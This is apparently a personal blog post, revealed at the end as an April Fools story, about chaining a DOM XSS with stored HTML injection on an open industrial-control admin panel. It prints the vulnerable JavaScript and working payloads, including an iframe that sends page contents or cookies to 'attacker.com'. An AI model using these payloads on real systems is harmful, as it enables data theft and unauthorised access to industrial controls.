About 3 days ago, I was recursively bruteforcing subdomains for a domain and I stumbled upon a domain that hosted an admin panel.
I guess it was my lucky day because it didn't require any authentication.
It a web interface to monitor and control some sort of industrial machines.
They might have thought that it's well hidden and it needs to be accessed a million times a day by every other employee so they kept it open to keep off the hassle.

I thought I hit the jackpot but then I realised I could just monitor the systems, I needed credentials to make the machines do anything.
<!--more-->
I really wanted to do more so I started to look for what else could be done.
10 minutes into testing and shit and XSStrike found a potenial DOM XSS vulnerability.
The vulnerable code was the following:

```javascript
if (location.hash) {
  if (location.hash.substring(1, 2) === "_") {
    var channel, url, hash = location.href.substring(location.href.indexOf("#") + 3), indexOf = hash.indexOf(",");
    if (indexOf == -1) {
      channel = hash;
    }
    else {
      channel = hash.substring(0, indexOf);
      url = decodeURIComponent(hash.substring(indexOf + 1));
    }
    switch (location.hash.substring(2, 3)) {
      case "2":
        // NameTransport local
        window.parent.parent.easyXDM.Fn.get(channel)(window.name);
        location.href = url + "#_4" + channel + ",";
        break;
      case "3":
        location.href = url + "#_4" + channel + ",";
        break;
      case "4":
        // NameTransport idle
        var fn = window.parent.easyXDM.Fn.get(channel + "_load");
        if (fn) {
          fn();
        }
        break;
    }
  }
}
```

XSStrike picked up that input from a source (`location.hash` in this case) was being supplied to a sink (`location.href` in this case), crafing the payload was upto me.
I finally came up with `#_3channel,javascript:alert(1)//`.

But as an attacker, I would need to send the link to someone who had credentials but I couldn't do it, I didn't have the permission to interact with the staff.
So I started to look for other things, got a bunch of useless CSRFs but at last I found what I needed the most, stored XSS.
There was a feature to include notes so employees can collaborate on things and it was vulnerable to XSS*. I shouldn't call it XSS because I wasn't actually able to execute JavaScript.

Backend was filtering event handlers based on `on[a-zA-Z]*` pattern, `<script`, `href` and `data` attributes and a few other things I tried. Without having the ability to execute JavaScript, it was plain boring HTML injection.

But hey! I had DOM XSS! I knew exactly what to do, I tried injecting `<iframe src="http://xx.yy.redacted.com/panel/main.html#_3channel,javascript:alert(1)//"` and it worked like a charm!
If there's a god, I am pretty sure he is determined to make my life harder than a morning wood because the cookies had the http_only flag :')
That wasn't much of problem because I could still dig deeper if I could see what an authorised person has access to but there was another problem, `script`s weren't allowed to make cross origin requests.
I would say **fuck** at this if I were you but I have said that enough times already.

I am not sure if it was public knowledge already but I discovered a way to access DOM, retrieve data and send it to my server bypassing all the restriction.
Yeah, we all know the `<img src="//attacker.com/?="+document.cookie>` trick but it doesn't work if you try to do `<img src="//attacker.com/?="+document.documentElement.innerHTML>` for obvious reasons.

So here's the trick, `img` tag can make requests to an external resource and the `script` tag can execute arbitrary JavaScript so we can grab the data we want with a `script` tag, create a new `img` element whose `src` has the juicy data in it's URL as `//attacker.com/?=juicy_data`.

Now the final payload had become this,

```javascript
#_3channel,javascript:(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML//
```

To execute it, I added the following payload to a note

```javascript
<iframe src="http://xx.yy.redacted.com/panel/main.html#_3channel,javascript:(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML//">
```

I hope you know what the above payload does.

Anyways, after tons of response from unathenticated users, I finally got one from an authenticated one. How did I know?
Well it didn't had the string `Log in XYZ...`.
Since the source was very long and couldn't be included in a single HTTP request, I had to `slice()` it which took more than hour but it was fruitful.
It had the endpoints to control various aspects of various machines.

That's it! I wrote a script to automate the process of creating a note that injects payload to executre given command when opened by an authenticated person.

One more thing. none of it happened, Happy april fools day :p

Anyways, Marvel is better than DC <3
